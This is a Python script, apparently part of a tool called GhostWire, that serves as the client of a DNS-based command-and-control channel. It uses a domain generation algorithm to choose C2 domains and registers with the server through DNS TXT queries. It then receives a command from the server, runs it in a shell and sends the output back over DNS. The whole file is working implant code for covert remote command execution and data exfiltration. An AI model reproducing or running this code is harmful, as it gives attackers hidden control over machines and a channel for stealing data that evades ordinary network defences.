"""
GhostWire Command Test
======================
Stays alive so you can queue commands from the server.
"""

import sys
import os
import secrets
import dns.resolver
import subprocess

sys.path.insert(0, os.path.dirname(__file__))

from shared.protocol import MSG_REGISTER, MSG_BEACON, MSG_CMDREQ, MSG_DATA, build_query
from shared.config import C2_DOMAINS, DGA_SEED, DGA_LENGTH, DNS_LISTEN_PORT
from shared.dga import DGA


def send_dns_query(query_name, dns_server="127.0.0.1", dns_port=5354):
    """Send a DNS query and return the TXT record response."""
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        resolver.port = dns_port
        answers = resolver.resolve(query_name, 'TXT')
        for rdata in answers:
            text = b''.join(rdata.strings).decode()
            return text
    except Exception as e:
        return f"ERROR: {e}"


def main():
    dga = DGA(seed=DGA_SEED, length=DGA_LENGTH, domain=C2_DOMAINS[0], backup_domains=C2_DOMAINS[1:])
    session_id = secrets.token_hex(4)
    dga_label = dga.generate_label()

    # Try primary domain first, then backups
    connected = False
    active_domain = None

    print("=" * 60)
    print("  GhostWire Command Test (Multi-Domain)")
    print("=" * 60)
    print(f"  Session ID: {session_id}")
    print(f"\n  Trying domains:")
    for i, domain in enumerate(C2_DOMAINS):
        tag = "PRIMARY" if i == 0 else f"BACKUP {i}"
        print(f"    [{tag}] {domain}")

    # Try each domain until one works
    for i, domain in enumerate(C2_DOMAINS):
        full_domain = dga.generate(domain_index=i)
        tag = "PRIMARY" if i == 0 else f"BACKUP {i}"
        print(f"\n  [{tag}] Attempting: {full_domain}")

        query = build_query(session_id, MSG_REGISTER, dga_label=dga.generate_label(domain_index=i), domain=domain)
        response = send_dns_query(query)

        if response == "ACK":
            print(f"  [{tag}] ✅ Connected to {domain}")
            connected = True
            active_domain = domain
            active_domain_index = i
            break
        else:
            print(f"  [{tag}] ❌ No response from {domain}")

    if not connected:
        print("\n  ❌ Could not connect to any domain!")
        return

    print(f"\n  Active domain: {active_domain}")
    print(f"\n  ⚡ Go to your SERVER terminal and type:")
    print(f"\n     cmd {session_id} whoami\n")
    print(f"  Then press ENTER here to check for commands...")

    input("\n  Press ENTER to check for commands...")

    # Ask for command
    query = build_query(session_id, MSG_CMDREQ, dga_label=dga.generate_label(domain_index=active_domain_index),
                        domain=active_domain)
    response = send_dns_query(query)
    print(f"\n  Server response: {response}")

    if response.startswith("CMD:"):
        command = response[4:]
        print(f"  ⚡ Received command: {command}")

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        output = output.strip()[:60]

        print(f"  📤 Command output: {output}")

        query = build_query(session_id, MSG_DATA, encoded_data=output,
                            dga_label=dga.generate_label(domain_index=active_domain_index), domain=active_domain)
        response = send_dns_query(query)

        if response == "ACK":
            print(f"  ✅ Result sent to server!")

    elif response == "NOOP":
        print(f"  ℹ️  No commands waiting. Try queueing one on the server first!")

    print("\n" + "=" * 60)
    print("  ✅ Command test complete! Check server terminal.")
    print("=" * 60)


if __name__ == "__main__":
    main()

